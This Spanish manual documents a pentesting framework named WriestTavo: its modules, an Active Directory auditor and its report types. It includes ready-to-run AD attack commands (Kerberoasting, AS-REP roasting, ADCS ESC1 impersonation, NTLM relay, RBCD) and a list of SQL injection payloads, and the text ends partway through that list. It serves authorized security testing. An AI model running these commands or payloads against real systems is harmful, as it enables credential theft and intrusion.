# ⚡ WriestTavo v4.1 — Manual Completo
### Bug Bounty · Pentesting · AD Audit · Vuln Analysis · CTF
**By WRIΞSTTAV0**

---

> ⚠️ **AVISO LEGAL**: Este script debe usarse ÚNICAMENTE en sistemas con autorización explícita del propietario. El uso no autorizado es ilegal. Solo para entornos propios, Bug Bounty con scope definido, o auditorías con contrato firmado.

---

## 📋 Tabla de Contenidos

1. [¿Qué es WriestTavo?](#qué-es-wriestTavo)
2. [Novedades v4.1](#novedades-v41)
3. [Instalación y Requisitos](#instalación-y-requisitos)
4. [Primeros Pasos](#primeros-pasos)
5. [Modos de Escaneo](#modos-de-escaneo)
6. [Menú de Presets](#menú-de-presets)
7. [Los 45 Módulos — Referencia Completa](#los-45-módulos)
8. [Módulo 45: ADPulse — Active Directory Auditor](#módulo-45-adpulse)
9. [Sistema INTEL — Inteligencia Compartida](#sistema-intel)
10. [Sistema de Reportes — 4 Tipos](#sistema-de-reportes)
11. [Sistema de Actualización](#sistema-de-actualización)
12. [Agregar Payloads Propios](#agregar-payloads-propios)
13. [Catálogo de Payloads Modernos](#catálogo-de-payloads-modernos)
14. [Agregar Módulos Propios](#agregar-módulos-propios)
15. [Exploit Intelligence — EDB + NVD + GHSA](#exploit-intelligence)
16. [Flujo Completo de Trabajo](#flujo-completo-de-trabajo)
17. [Comandos de Referencia Rápida](#comandos-de-referencia-rápida)
18. [Estructura de Archivos](#estructura-de-archivos)
19. [Preguntas Frecuentes](#preguntas-frecuentes)

---

## ¿Qué es WriestTavo?

WriestTavo es un **framework de pentesting automatizado** con 45 módulos que cubren el stack tecnológico moderno completo. No es solo un escáner — es un sistema de **inteligencia compartida**: cada módulo aprende del anterior y adapta sus técnicas automáticamente.

```
Scanner normal:       WriestTavo:
  Escanea → reporta    Escanea → aprende → adapta → escala → reporta

  Sin contexto         whatweb detecta Laravel
                            ↓
                       gobuster usa wordlist Laravel
                            ↓
                       LFI busca /.env, /storage/logs/
                            ↓
                       SSTI prueba payloads Blade/Twig
                            ↓
                       EDB busca "laravel" en exploits
                            ↓
                       ADPulse audita si detecta DC/LDAP
                            ↓
                       3 reportes: Cliente / Censurado / Pentester
```

### Cobertura del Stack Moderno

| Categoría | Tecnologías Cubiertas |
|-----------|----------------------|
| **Frontend** | React, Next.js, Vue, Nuxt, Angular, Svelte/Kit, Astro, Remix |
| **Backend** | PHP/Laravel/Symfony, Node.js/Express/NestJS, Python/Django/Flask/FastAPI, .NET/ASP.NET Core, Ruby on Rails, Java/Spring/Tomcat |
| **CMS** | WordPress, Joomla, Drupal, Magento |
| **Bases de datos** | MySQL, PostgreSQL, MongoDB, Redis, Elasticsearch |
| **Servidores** | Apache, Nginx, IIS (Windows), Caddy |
| **Cloud/Infra** | Docker, Kubernetes, AWS/GCP/Azure metadata, Prometheus, Grafana |
| **APIs** | REST, GraphQL, Swagger/OpenAPI, FastAPI /docs, gRPC básico |
| **Active Directory** | Kerberoasting, AS-REP, ADCS ESC1/ESC2, Delegation, LAPS, SMB Signing, GPOs |

---

## Novedades v4.1

### 🏢 Módulo 45 — ADPulse Active Directory Auditor

35 checks de seguridad sobre Active Directory mediante conexión LDAP de **solo lectura**. Integrado completamente en el sistema INTEL y reportes.

| Categoría | Checks |
|-----------|--------|
| **Credenciales** | Null Bind, Kerberoasting, AS-REP Roasting, Contraseñas en Description, PASSWD_NOTREQD |
| **Privilegios** | Unconstrained/Constrained Delegation, adminCount=1 huérfano, grupos nested en DA, LAPS |
| **Certificados (ADCS)** | ESC1 (Enrollee Supplies Subject), ESC2 (Any Purpose EKU) |
| **Configuración** | KRBTGT age, política de contraseñas, nivel funcional, MachineAccountQuota, trusts |
| **Protocolos** | SMB Signing, LDAP Signing, Protected Users group, Recycle Bin |
| **Cuentas** | Guest habilitado, inactivas >90 días, sin expiración, dual-use con email |
| **Auditoría** | GPOs, Fine-Grained PSO, configuración de audit policy |
| **Recolección** | BloodHound automático, dump completo usuarios/grupos/equipos |

### 📊 Sistema de 4 Reportes

Al terminar cada scan se generan **4 archivos HTML** simultáneamente:

| # | Archivo | Audiencia | Contenido |
|---|---------|-----------|-----------|
| Original | `reporte_TARGET_FECHA.html` | Auditor | Reporte técnico clásico WriestTavo |
| 1 | `reporte_CLIENTE_*.html` | Equipo IT / Cliente | Ejecutivo + payloads confirmados con badge |
| 2 | `reporte_CENSURADO_*.html` | Dirección / Legal / Terceros | IPs, URLs, comandos y hashes redactados |
| 3 | `reporte_PENTESTER_*.html` | Analista / Red Team | Técnico completo + attack chains + tips |

### 💣 Tracking de Payloads Efectivos

Los módulos ahora registran automáticamente qué payloads funcionaron:
```bash
register_payload "SQLi" "' OR SLEEP(3)--" "https://target.com/search?q=" "Delay 3.1s detectado"
register_payload "LFI"  "/etc/passwd" "https://target.com/?file=" "root:x:0:0 encontrado"
```
Estos aparecen en el Reporte Cliente como `✓ INYECCIÓN CONFIRMADA` y en el Reporte Pentester como tabla de evidencia.

---

## Instalación y Requisitos

### Requisito Base

- **Kali Linux** (recomendado) o cualquier distro Debian/Ubuntu
- `sudo` / root
- Python 3.x (ya incluido en Kali)
- Conexión a internet (para módulos online, EDB, NVD)

### Instalación Automática (recomendado)

```bash
chmod +x wriestTavo.sh
sudo ./wriestTavo.sh --install
```

El instalador cubre automáticamente:

```
# Via apt:
nmap  curl  python3  python3-pip  git  wget  whatweb  nikto
gobuster  wafw00f  sslscan  dnsrecon  smtp-user-enum  snmp
sqlmap  wpscan  crackmapexec  commix  enum4linux-ng
seclists  wordlists  exploitdb  ldap-utils

# Via Go:
nuclei    subfinder    dalfox

# Via pip3:
arjun    dnsrecon    theHarvester    bloodhound
```

### Instalación Manual

```bash
# Core
sudo apt update && sudo apt install -y nmap curl python3 python3-pip git

# Web scanning
sudo apt install -y whatweb nikto gobuster wafw00f sslscan nuclei

# Recon OSINT
sudo apt install -y dnsrecon subfinder
pip3 install theHarvester --break-system-packages

# Fuzzing y análisis
sudo apt install -y ffuf sqlmap wpscan commix
pip3 install arjun --break-system-packages

# Infra / Red Team
sudo apt install -y crackmapexec enum4linux-ng snmp smtp-user-enum

# Exploit DB local
sudo apt install -y exploitdb   # incluye searchsploit

# Payloads
sudo apt install -y seclists wordlists

# XSS avanzado
go install github.com/hahwul/dalfox/v2@latest
```

### Instalación Extra para ADPulse (Módulo 45)

```bash
# LDAP — requerido para ADPulse
sudo apt install -y ldap-utils

# Impacket — para attack chains en Reporte Pentester
sudo apt install -y python3-impacket
# o la versión más actualizada:
pip3 install impacket --break-system-packages

# BloodHound Python — recolección automática desde ADPulse
pip3 install bloodhound --break-system-packages

# Certipy — ADCS attack chains
pip3 install certipy-ad --break-system-packages

# BloodHound GUI (para analizar los datos recolectados)
sudo apt install -y bloodhound neo4j
```

### Instalación Extra para los 3 Reportes

Los reportes son HTML puro — no requieren dependencias adicionales. Se abren en cualquier navegador:

```bash
# Abrir reportes automáticamente al terminar el scan:
firefox wriestTavo_results/reporte_CLIENTE_*.html &
firefox wriestTavo_results/reporte_PENTESTER_*.html &

# O todos a la vez:
for f in wriestTavo_results/reporte_*.html; do firefox "$f" &; done
```

> **Nota**: Los reportes usan fuentes del sistema y no requieren internet para verse correctamente.

---

## Primeros Pasos

```bash
# 1. Instalar dependencias
sudo ./wriestTavo.sh --install

# 2. Actualizar BD de exploits y CVEs
sudo ./wriestTavo.sh --update

# 3. (Opcional) Configurar auto-actualización diaria
sudo ./wriestTavo.sh --cron

# 4. Primer scan
sudo ./wriestTavo.sh 192.168.1.100
# → Al lanzar aparece el menú de presets
```

### Ejemplos de uso rápido

```bash
sudo ./wriestTavo.sh 192.168.1.100           # IP directa
sudo ./wriestTavo.sh https://app.ejemplo.com  # HTTPS con ruta
sudo ./wriestTavo.sh --mode stealth target.com       # Silencioso (WAF bypass)
sudo ./wriestTavo.sh --mode aggressive 10.10.10.X    # Agresivo (CTF/HTB)
```

---

## Modos de Escaneo

| Modo | Puerto Scan | Delay | Threads | Ideal para |
|------|------------|-------|---------|-----------|
| `normal` | top-1000 | Sin delay | Estándar | Pentesting general |
| `stealth` | top-500 | +delay WAF | Reducidos | Bug Bounty, producción |
| `aggressive` | todos (-p-) | Sin delay | Máximos | CTF, HTB, lab |

```bash
sudo ./wriestTavo.sh --mode stealth https://target.com
sudo ./wriestTavo.sh --mode aggressive 10.10.10.X
```

---

## Menú de Presets

```
  ╔═══ WriestTavo v4.1 — 45 módulos ═══╗
  ║  [1] Full Scan (45 módulos, 7 fases)  ║
  ║  [2] Recon OSINT          (pasivo)    ║
  ║  [3] Web + SSL                        ║
  ║  [4] Bug Bounty Pro                   ║
  ║  [5] Injection Suite                  ║
  ║  [6] API Modern                       ║
  ║  [7] Windows/Infra + AD               ║
  ║  [8] Framework Deep                   ║
  ║  [9] WordPress                        ║
  ║ [10] CTF/HTB Mode                     ║
  ║ [11] Custom (elegir módulos 1-45)     ║
  ╚═════════════════════════════════════╝
```

| Preset | Módulos incluidos | Uso típico |
|--------|-------------------|-----------|
| **[1] Full Scan** | Los 45 módulos en 7 fases incluyendo ADPulse | Auditoría completa |
| **[2] Recon OSINT** | crtsh + theHarvester + dnsrecon | Reconocimiento 100% pasivo |
| **[3] Web + SSL** | WAF + nikto + nuclei + gobuster + sslscan | Web rápido |
| **[4] Bug Bounty Pro** | Recon + web + injection + CORS + JWT + SSRF + EDB | Bug bounty |
| **[5] Injection Suite** | SQLi + NoSQLi + XSS + LFI + SSTI + SSRF + CMDi | Testing de inyecciones |
| **[6] API Modern** | Endpoints + GraphQL + Swagger + JWT + CORS | APIs REST/GraphQL |
| **[7] Windows/Infra + AD** | IIS + SMB + Docker + K8s + SNMP + **ADPulse** | Entornos Windows/AD |
| **[8] Framework Deep** | framework_scan + SSTI + rutas críticas | Laravel/Django/Rails |
| **[9] WordPress** | wpscan + nuclei + gobuster + SQLi + XSS | Auditoría WordPress |
| **[10] CTF/HTB** | Todos los módulos modo agresivo incluyendo ADPulse | CTF/laboratorio |
| **[11] Custom** | Elegir módulos 1-45 individualmente | Manual / targeted |

---

## Los 45 Módulos

### FASE 1: Reconocimiento Pasivo

| # | Módulo | Qué hace | Retroalimenta |
|---|--------|----------|---------------|
| 26 | `crtsh` | Subdominios desde Certificate Transparency logs. 100% pasivo. | `INTEL_SUBDOMAINS[]` |
| 17 | `theharvester` | Emails, IPs, subdominios desde Google, Bing, urlscan. | `INTEL_SUBDOMAINS[]` |
| 18 | `dnsrecon` | Zone transfer, SPF, DMARC, MX, fuerza bruta DNS. | `INTEL_SERVICES[]` |

### FASE 2: Infraestructura

| # | Módulo | Qué hace | Retroalimenta |
|---|--------|----------|---------------|
| 1 | `ttl_os` | Detecta OS por TTL (64=Linux, 128=Windows). | `INTEL_OS` |
| 2 | `port_scan` | nmap TCP. Detecta puertos web, SMB, LDAP, SNMP, etc. | `WEB_PORTS[]`, activa módulos condicionalmente |
| 3 | `version_scan` | Versiones exactas de servicios. | `INTEL_TECHNOLOGIES[]` |
| 38 | `infra_exposure` | Docker API, Kubernetes, Prometheus, Grafana sin auth. | `INTEL_DOCKER_EXPOSED`, `INTEL_K8S_EXPOSED` |

### FASE 3: Servicios de Red

| # | Módulo | Qué hace | Se activa cuando |
|---|--------|----------|-----------------|
| 10 | `smb` | SMB null sessions, shares, enum4linux-ng. | Puerto 445/139 |
| 29 | `cme` | CrackMapExec: SMB signing, LDAP, WinRM. | Puerto 445/389/5985 |
| 28 | `snmp` | Community strings por defecto. | Puerto 161 |
| 27 | `smtp_enum` | Enumera usuarios con VRFY sin autenticación. | Puerto 25/465/587 |
| 9 | `subdominios` | Fuerza bruta subdominios con subfinder/amass. | Siempre si es dominio |

### FASE 4: Fingerprinting Web

| # | Módulo | Qué hace | Retroalimenta |
|---|--------|----------|---------------|
| 4 | `waf` | Detecta WAF (Cloudflare, Akamai, AWS WAF, F5…). Ajusta delay automáticamente. | `INTEL_WAF_DETECTED`, `INTEL_SCAN_DELAY` |
| 5 | `http_headers` | CSP, HSTS, X-Frame-Options, cookies sin flags, server version. | `INTEL_TECHNOLOGIES[]` |
| 19 | `sslscan` | TLS/SSL: versiones obsoletas, ciphers débiles, Heartbleed, cert expirado. | Solo si puerto 443/8443 |
| 6 | `whatweb` | CMS, framework, librerías. 50+ tecnologías detectadas. | `INTEL_CMS`, `INTEL_FRAMEWORK_*` |
| 25 | `wpscan` | Usuarios, plugins, themes WordPress con CVEs. | Solo si `INTEL_CMS=wordpress` |
| 7 | `nikto` | Vulnerabilidades web conocidas genéricas. | `INTEL_NIKTO_FINDINGS` |

### FASE 5: Escaneo Profundo

| # | Módulo | Qué hace | Se adapta según |
|---|--------|----------|----------------|
| 20 | `nuclei` | 9000+ templates: CVEs, misconfigs, exposures. Estándar bug bounty. | `INTEL_CMS` → templates específicos |
| 30 | `framework_scan` | Rutas críticas del framework: `.env`, `/telescope`, `/_next/`, `/actuator`, etc. | `INTEL_FRAMEWORK_*` |
| 8 | `gobuster` | Fuerza bruta directorios. Wordlist según CMS detectado. | `INTEL_WORDLIST_EXTRA` por CMS |
| 24 | `arjun` | Descubre parámetros GET/POST ocultos: debug, admin, cmd, file, redirect. | → `INTEL_INJECTABLE_URLS[]` |
| 15 | `endpoints` | Endpoints API: `/api/v1/`, `/graphql`, `/swagger`, `/actuator`. | `INTEL_GRAPHQL_URL`, `INTEL_SWAGGER_URL` |
| 16 | `js_analysis` | Secrets, JWTs, API keys en JS bundles. | `INTEL_JWT_TOKENS[]`, `INTEL_JS_SECRETS[]` |

### FASE 6: Vulnerabilidades Web

| # | Módulo | Qué hace | Se activa/adapta cuando |
|---|--------|----------|------------------------|
| 13 | `sqli` | SQLi básico: errores, time-based. Payloads por DB detectada. | `INTEL_INJECTABLE_URLS[]` |
| 21 | `sqlmap` | Confirma y explota SQLi. `--tamper` si hay WAF. | **Solo si** `INTEL_SQLI_FOUND=true` |
| 36 | `nosqli` | MongoDB injection: `{$gt:""}`, bypass de login. | Si MongoDB en `INTEL_TECHNOLOGIES` |
| 14 | `xss` | XSS reflejado en parámetros. | `INTEL_INJECTABLE_URLS[]` |
| 22 | `dalfox` | XSS avanzado: DOM-based, Header-based, CSP bypass. | Profundiza módulo 14 |
| 23 | `commix` | Command injection / OS RCE. | `INTEL_INJECTABLE_URLS[]` |
| 31 | `lfi` | LFI/Path Traversal. Escala: LFI → RFI → PHP wrappers → log poisoning. | Payloads de `INTEL_EXTRA_PAYLOADS_LFI[]` |
| 32 | `ssrf` | SSRF. Si confirma → prueba AWS/GCP/Azure metadata automáticamente. | `INTEL_INJECTABLE_URLS[]` |
| 33 | `ssti` | Template injection: Jinja2, Twig, Blade, Smarty, ERB. RCE si confirma. | `INTEL_FRAMEWORK_BACKEND` con engine |
| 34 | `cors` | CORS misconfig. **Genera cors_poc.html automáticamente.** | → `INTEL_CORS_VULN=true` |
| 35 | `jwt` | Analiza JWTs: alg:none, RS256→HS256, crack con hashcat. | `INTEL_JWT_TOKENS[]` de módulo 16 |
| 39 | `xxe` | XXE en APIs XML, SOAP, SVG upload. | `INTEL_TECHNOLOGIES` con java/php/.net |
| 40 | `idor_redirect` | IDOR en IDs incrementales. Open Redirect en parámetros de redirect. | `INTEL_API_ENDPOINTS[]` |
| 41 | `iis_windows` | ShortName 8.3, WebDAV, NTLM exposure, ViewState sin MAC. | Solo si `INTEL_OS=windows` |
| 37 | `http_methods` | PUT, DELETE, TRACE, CONNECT. PUT → intenta subir webshell de prueba. | Todos los targets web |

### FASE 7: Post-Scan

| # | Módulo | Qué hace |
|---|--------|----------|
| 43 | `edb_intel` | Exploit Intelligence: EDB local + EDB online + NVD CVEs (CVSS≥9) + GHSA |
| 11 | `vuln_scan` | nmap NSE vuln scripts sobre puertos detectados |
| 12 | `searchsploit` | Busca exploits para versiones exactas detectadas |
| 44 | `edb_search` | Búsqueda manual interactiva en EDB + NVD + GHSA |
| **45** | **`adpulse`** | **ADPulse: 35 checks de seguridad en Active Directory (LDAP solo lectura)** |

---

## Módulo 45: ADPulse

ADPulse es el auditor de Active Directory integrado en WriestTavo. Usa una conexión **LDAP de solo lectura** — no modifica ningún objeto del directorio.

### Activación

```bash
# Desde el menú
sudo ./wriestTavo.sh 192.168.1.10   # IP del Domain Controller
# → [45] ADPulse Audit  (o [7] Windows/Infra, [10] CTF/HTB)

# Al ejecutarse pide 3 datos:
#   IP del DC: 192.168.1.10
#   Dominio FQDN: corp.local
#   Usuario: ldapuser
#   Contraseña: ****
```

### Los 35 Checks

| # | Check | Severidad | Técnica de Ataque Relacionada |
|---|-------|-----------|-------------------------------|
| 1 | Null Bind LDAP | 🔴 CRÍTICO | Enumeración anónima |
| 2 | **Kerberoasting** (SPNs) | 🔴 CRÍTICO | Crack offline de TGS hashes |
| 3 | **AS-REP Roasting** | 🔴 CRÍTICO | Crack offline sin preauth |
| 4 | **Unconstrained Delegation** | 🔴 CRÍTICO | Robo de TGT de DA |
| 5 | Constrained Delegation | 🟠 MEDIO | S4U2Self/S4U2Proxy abuse |
| 6 | Grupos privilegiados (DA/EA/SA) | 🟠 ALTO | Inventario de targets |
| 7 | **KRBTGT password age** | 🔴 CRÍTICO | Golden Ticket persistence |
| 8 | Contraseñas sin expiración | 🟡 BAJO | Password spray |
| 9 | Cuentas inactivas >90 días | 🟠 MEDIO | Cuentas abandonadas |
| 10 | Política de contraseñas débil | 🟠 ALTO | Password spraying |
| 11 | adminCount=1 huérfano (SDProp) | 🟠 ALTO | ACL abuse |
| 12 | **Contraseñas en Description** | 🔴 CRÍTICO | Credenciales en texto claro |
| 13 | DCSync permissions | 🔴 CRÍTICO | Dump de hashes NTLM |
| 14 | **LAPS** no instalado | 🟠 ALTO | Lateral movement por admins locales |
| 15 | **ADCS ESC1** | 🔴 CRÍTICO | Impersonation de cualquier usuario |
| 16 | **ADCS ESC2** (Any Purpose EKU) | 🔴 CRÍTICO | Certificado para cualquier uso |
| 17 | Guest account habilitado | 🟠 ALTO | Reconocimiento inicial |
| 18 | **SMB Signing no requerido** | 🔴 CRÍTICO | NTLM Relay attack |
| 19 | LDAP Signing no enforced | 🟠 MEDIO | LDAP Relay |
| 20 | Protected Users group vacío | 🟠 MEDIO | Pass-the-Hash/Ticket |
| 21 | Domain Trusts bidireccionales | 🟠 ALTO | Cross-domain attack |
| 22 | GPOs — enumeración | ℹ INFO | GPO abuse (requiere BloodHound) |
| 23 | Sin Fine-Grained PSO | 🟡 BAJO | Password spray facilitado |
| 24 | Nivel funcional obsoleto | 🟠 MEDIO | Funciones de seguridad deshabilitadas |
| 25 | **MachineAccountQuota > 0** | 🟠 ALTO | RBCD attack sin credenciales de servicio |
| 26 | Grupos nested en Domain Admins | 🟠 ALTO | Escalada indirecta |
| 27 | Domain Admins con email | 🟠 MEDIO | Phishing de cuentas privilegiadas |
| 28 | AD Recycle Bin deshabilitado | 🟡 BAJO | No recovery de objetos |
| 29 | Sin GPO de auditoría avanzada | 🟠 MEDIO | Ataques sin detección |
| 30 | **PASSWD_NOTREQD activo** | 🔴 CRÍTICO | Cuentas con contraseña vacía |
| 31 | BloodHound — recolección | ℹ INFO | Análisis visual de attack paths |
| 32 | Impacket disponible | ℹ INFO | Verificación de tooling |
| 33 | Dump completo usuarios | ℹ INFO | → `all_users.txt` |
| 34 | Dump completo grupos | ℹ INFO | → `all_groups.txt` |
| 35 | Dump completo equipos | ℹ INFO | → `all_computers.txt` |

### Archivos Generados por ADPulse

```
wriestTavo_results/active_directory/
├── all_users.txt          # Todos los usuarios del dominio
├── all_groups.txt         # Todos los grupos y membresías
├── all_computers.txt      # Todos los equipos del dominio
├── kerberoastable.txt     # SPNs para kerberoasting
├── inactive_accounts.txt  # Cuentas sin logon >90 días
├── gpos.txt               # GPOs del dominio
├── adpulse_log.txt        # Log del módulo
└── bloodhound/            # Datos BloodHound (si disponible)
    └── *.zip
```

### Herramientas de Follow-Up

```bash
# Kerberoasting
impacket-GetUserSPNs 'corp.local/ldapuser:Password123' \
  -dc-ip 192.168.1.10 -request -outputfile kerberoast.hashes
hashcat -m 13100 kerberoast.hashes rockyou.txt --force

# AS-REP Roasting
impacket-GetNPUsers corp.local/ -usersfile users.txt \
  -format hashcat -outputfile asrep.hashes -dc-ip 192.168.1.10
hashcat -m 18200 asrep.hashes rockyou.txt

# ADCS ESC1
certipy req -u USER@corp.local -p PASS -ca CA-NAME \
  -template TEMPLATE -upn administrator@corp.local -dc-ip 192.168.1.10

# SMB Signing deshabilitado → NTLM Relay
responder -I eth0 -rdw
impacket-ntlmrelayx -smb2support -t ldaps://192.168.1.10 --add-computer

# RBCD (MachineAccountQuota > 0)
impacket-addcomputer corp.local/USER:PASS -computer-name 'ATTACKER$' \
  -computer-pass 'Password123!' -dc-ip 192.168.1.10
impacket-rbcd -f ATTACKER -t TARGET -dc-ip 192.168.1.10 \
  corp.local/USER:PASS -action write
```

---

## Sistema INTEL

El cerebro de WriestTavo. Variables compartidas entre todos los módulos para scan progresivo e inteligente.

### Variables Principales (84 en total)

```bash
# OS y Red
INTEL_OS=""                    # linux | windows | other
INTEL_WAF_DETECTED=false
INTEL_WAF_NAME=""
INTEL_SCAN_DELAY=0             # Auto-aumenta si hay WAF

# Frameworks
INTEL_CMS=""                   # wordpress | joomla | drupal | magento
INTEL_FRAMEWORK_JS=""          # react | nextjs | vue | nuxt | angular | svelte | astro
INTEL_FRAMEWORK_BACKEND=""     # laravel | symfony | django | flask | fastapi | nestjs | express | aspnet | rails
INTEL_TECHNOLOGIES=()          # php, nodejs, python, java, mysql, redis, docker...

# URLs y Descubrimientos
INTEL_INJECTABLE_URLS=()       # → SQLi, XSS, LFI, SSRF
INTEL_API_ENDPOINTS=()         # → arjun, NoSQLi, XXE
INTEL_SENSITIVE_PATHS=()
INTEL_JWT_TOKENS=()            # → módulo 35 JWT
INTEL_JS_SECRETS=()
INTEL_GRAPHQL_URL=""
INTEL_SWAGGER_URL=""

# Vulnerabilidades Confirmadas
INTEL_SQLI_FOUND=false         # → activa sqlmap automáticamente
INTEL_XSS_FOUND=false
INTEL_LFI_FOUND=false
INTEL_LFI_PARAM=""
INTEL_LFI_URL=""
INTEL_SSRF_FOUND=false
INTEL_SSRF_URL=""              # → prueba cloud metadata auto
INTEL_SSTI_FOUND=false
INTEL_CORS_VULN=false
INTEL_JWT_ALG_NONE=false
INTEL_JWT_WEAK_SECRET=""

# Infraestructura
INTEL_DOCKER_EXPOSED=false
INTEL_K8S_EXPOSED=false
INTEL_CLOUD_PROVIDER=""        # aws | gcp | azure | cloudflare

# Payloads Confirmados (nuevo en v4.1)
EFFECTIVE_PAYLOADS=()          # "tipo|||payload|||url|||evidencia"

# ADPulse (nuevo en v4.1)
AD_KERBEROASTABLE=()
AD_ASREPROASTABLE=()
AD_ADCS_TEMPLATES=()
AD_UNCONSTRAINED=()
AD_DA_MEMBERS=()
```

---

## Sistema de Reportes — 4 Tipos

### Cómo se generan

Al finalizar cualquier scan completo, WriestTavo genera automáticamente los 4 reportes:

```
wriestTavo_results/
├── reporte_TARGET_FECHA.html          ← Original (siempre existió)
├── reporte_CLIENTE_TARGET_FECHA.html  ← NUEVO v4.1
├── reporte_CENSURADO_FECHA.html       ← NUEVO v4.1
└── reporte_PENTESTER_TARGET_FECHA.html ← NUEVO v4.1
```

No requiere configuración ni flags adicionales. Todos se crean al mismo tiempo que el reporte original.

### Reporte 1 — Cliente IT (`reporte_CLIENTE_*.html`)

**Audiencia**: Gerente de TI, CISO, equipo IT del cliente.

**Diseño**: Fondo blanco, tipografía corporativa, colores de severidad estándar.

**Contenido**:
- Banner de nivel de riesgo global con color (🔴 CRÍTICO / 🟠 ALTO / etc.)
- CVSS promedio del scan
- **Plan de acción en 3 columnas temporales**:
  - 🔴 Acción Inmediata (0-48h) — solo críticos
  - 🟠 Próximo Sprint (1-2 semanas) — altos
  - 🟢 Backlog (30-90 días) — medios y bajos
- Contexto del entorno en chips visuales (OS, CMS, WAF, Cloud, stack)
- **Tabla de inyecciones confirmadas** con badge `✓ INYECCIÓN CONFIRMADA` sobre cada hallazgo donde el payload fue efectivo
- Hallazgos en lenguaje de negocio (sin comandos técnicos)
- Impacto por hallazgo en texto no técnico

**Lo que NO incluye**: IPs internas, comandos de explotación, rutas del sistema, hashes.

### Reporte 2 — Censurado (`reporte_CENSURADO_*.html`)

**Audiencia**: Dirección General, departamento Legal, Compliance, terceros sin clearance técnico.

**Redactado automáticamente**:

| Dato | Reemplazado por |
|------|----------------|
| IPs (`192.168.1.10`) | `[IP CENSURADA]` |
| URLs (`https://app.corp.com/admin`) | `[URL CENSURADA]` |
| Rutas (`/etc/passwd`, `C:\Windows\...`) | `[RUTA CENSURADA]` |
| Hashes (`a87ff679a2f3e71d9181a67...`) | `[HASH CENSURADO]` |
| Tokens JWT (`eyJ...`) | `[TOKEN JWT CENSURADO]` |
| Comandos (`<code>...</code>`) | `[COMANDO TÉCNICO OMITIDO]` |
| Salidas técnicas (`<pre>...</pre>`) | `[SALIDA TÉCNICA OMITIDA]` |
| Target en header | `[SISTEMA CENSURADO]` |

**Incluye**:
- Banner `CONFIDENCIAL — DISTRIBUCIÓN RESTRINGIDA`
- Nota de privacidad explicando qué fue omitido
- Tabla resumida: tipo de vulnerabilidad + severidad + CVSS + descripción genérica + remediación
- Disclaimer legal al pie

### Reporte 3 — Pentester (`reporte_PENTESTER_*.html`)

**Audiencia**: Analista de seguridad, Red Team, consultor de pentesting.

**Diseño**: Tema oscuro (#0d1117), fuente monoespaciada, estilo IDE/terminal.

**Contenido completo**:

**1. INTEL completo** — todas las variables con valor, incluyendo las más críticas en rojo:
- LFI URL y parámetro exacto
- SSRF URL confirmada
- CORS origin aceptado
- JWT secret crackeado
- SPNs Kerberoastables
- Templates ADCS vulnerables

**2. Attack Chains encadenadas** (autogeneradas según INTEL):

| Si se encontró... | Se genera cadena de... |
|-------------------|----------------------|
| SQLi + MySQL | Confirmar → Dump BD → Crackear hashes → `--os-shell` RCE |
| LFI + PHP | Confirmar → PHP wrapper → Log poisoning → Reverse shell |
| SSRF + AWS/GCP/Azure | Acceder metadata → Obtener IAM credentials → AWS CLI |
| SSTI + Jinja2/Twig | Confirmar motor → Payload RCE → Reverse shell |
| Kerberoasting | GetUserSPNs → hashcat -m 13100 → Pass-the-Hash → DA |

**3. Tabla de payloads efectivos** — payload exacto, URL, evidencia.

**4. URLs inyectables** — lista completa para copiar y pegar.

**5. Tips de exploración manual** por stack detectado:
- GraphQL: comandos de introspection + fingerprinting
- Docker API: containers → LPE con volumen `/`
- JWT débil: jwt_tool + forge token con rol admin
- CORS: PoC con fetch autenticado
- AD: BloodHound + secretsdump + certipy

**6. Comandos de seguimiento** listos para copiar.

---

## Sistema de Actualización

```bash
# Actualizar TODO:
# nuclei templates + NVD CVE feed (48h) + EDB RSS + SecLists + payloads custom
sudo ./wriestTavo.sh --update

# Auto-actualización diaria a las 6am
sudo ./wriestTavo.sh --cron

# Ver CVEs y payloads en caché
sudo ./wriestTavo.sh --show-cves

# Alerta automática si >7 días sin actualizar
```

---

## Agregar Payloads Propios

```bash
sudo ./wriestTavo.sh --add-payload "PAYLOAD" --payload-type TIPO
# tipos: sqli | xss | lfi | ssrf | paths
```

### Cómo se cargan

```
init_update_system() crea directorios
        ↓
_load_custom_payloads() lee archivos .txt de ~/.wriestTavo/custom_payloads/
        ↓
Carga en INTEL_EXTRA_PAYLOADS_SQLI[], INTEL_EXTRA_PAYLOADS_XSS[], etc.
        ↓
Módulos usan: ALL_PAYLOADS = BASE_PAYLOADS + CUSTOM_PAYLOADS
```

### Edición directa

```bash
nano ~/.wriestTavo/custom_payloads/sqli_extra.txt
nano ~/.wriestTavo/custom_payloads/xss_extra.txt
nano ~/.wriestTavo/custom_payloads/lfi_extra.txt
nano ~/.wriestTavo/custom_payloads/ssrf_extra.txt
nano ~/.wriestTavo/custom_payloads/paths_extra.txt
```

---

## Catálogo de Payloads Modernos

Lista de ~215 payloads **no incluidos** en el código base, seleccionados de HackerOne Hacktivity, PortSwigger Web Academy, PayloadsAllTheThings y OWASP Testing Guide 2024.

### Payloads base incluidos en el script

| Tipo | Cantidad base | Descripción |
|------|--------------|-------------|
| SQLi | 14 | `'`, `'--`, `' OR '1'='1`, `SLEEP`, `UNION SELECT NULL`... |
| XSS | 14 | `<script>alert`, `<img onerror`, `<svg onload`... |
| LFI | 20 | `../../../etc/passwd`, `php://filter`, `data://`, logs, Windows paths... |
| SSRF | 6 | `http://127.0.0.1/`, `localhost`, `0.0.0.0`, `[::1]`... |
| Paths | 0 | (gobuster usa wordlists de SecLists) |

### SQL Injection (~45 nuevos)

```bash
# ─── Bypass de Autenticación ───────────────────────────────────
sudo ./wriestTavo.sh --add-payload "' OR 1=1 LIMIT 1 OFFSET 0--" --payload-type sqli
sudo ./wriestTavo.sh --add-payload "admin'/*" --payload-type sqli
sudo ./wriestTavo.sh --add-payload "' OR 'unusual'='unusual'--" --payload-type sqli
sudo ./wriestTavo.sh --add-payload "') OR ('1'='1" --payload-type sqli
sudo ./wriestTavo.sh --add-payload "' OR 1=1#" --payload-type sqli
sudo ./wriestTavo.sh --add-payload "1' OR '1'='1'/*" --payload-type sqli

# ─── Time-Based Blind ──────────────────────────────────────────
# MySQL
sudo ./wriestTavo.sh --add-payload "1' AND (SELECT SLEEP(3))--" --payload-type sqli
sudo ./wriestTavo.sh --add-payload "' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--" --payload-type sqli
sudo ./wriestTavo.sh --add-payload "1' AND BENCHMARK(5000000,MD5(1))--" --payload-type sqli
# MSSQL
sudo ./wriestTavo.sh --add-payload "'; WAITFOR DELAY '0:0:3'--" --payload-type sqli
